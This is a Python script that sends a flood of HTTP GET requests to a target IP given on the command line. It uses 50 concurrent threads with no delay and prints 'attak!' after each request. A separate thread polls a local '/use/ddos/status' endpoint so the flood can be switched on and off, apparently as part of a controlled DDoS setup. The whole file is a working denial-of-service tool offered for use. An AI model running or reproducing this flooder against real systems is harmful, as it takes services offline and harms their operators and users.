import requests
import sys
import threading
import time
import asyncio
import aiohttp

d_flag = True

def statusCheck():
    print("Status Check Performed")
    async def worker():
        global d_flag
        async with aiohttp.ClientSession() as session:
            while True:
                aa = await send_request(session, 'http://127.0.0.1:7455/use/ddos/status')
                
                if aa == 200:
                    d_flag = True
                elif aa == 201:
                    d_flag = not True
                    print("Program Stopping!")
                    return 0
                await asyncio.sleep(10)

    loop = asyncio.new_event_loop()  # Create a loop for this thread
    asyncio.set_event_loop(loop)
    loop.run_until_complete(worker())



async def send_request(session, url):
    try:
        async with session.get(url) as response:
            # pass
            # print("[i] Request sent to:", url)
            # print("[i] Response:", response.status)
            return response.status
    except aiohttp.ClientError as e:  
        print("Error:", e)

def send_requests_concurrently(url, delay):
    async def worker():
        global d_flag
        async with aiohttp.ClientSession() as session:
            while True:
                if(d_flag):
                    await send_request(session, url)
                    await asyncio.sleep(delay)
                    print('attak!')
                else: 
                    return 0

    loop = asyncio.new_event_loop()  # Create a loop for this thread
    asyncio.set_event_loop(loop)
    loop.run_until_complete(worker())




if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script_name.py <IP> <port>")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = sys.argv[2]
    # url = f"http://{ip}:{port}"  # Combine IP and port to form the URL

    url = f"https://{ip}"  # Combine IP and port to form the URL
    delay = 0  # Adjust the delay (in seconds) between each request
    num_threads = 50  # Number of concurrent threads
    
    print("Sending HTTP requests concurrently using multithreading...")
    
    checkThread = threading.Thread(target=statusCheck)
    checkThread.start()    
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_requests_concurrently, args=(url, delay))
        threads.append(thread)
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    checkThread.join()

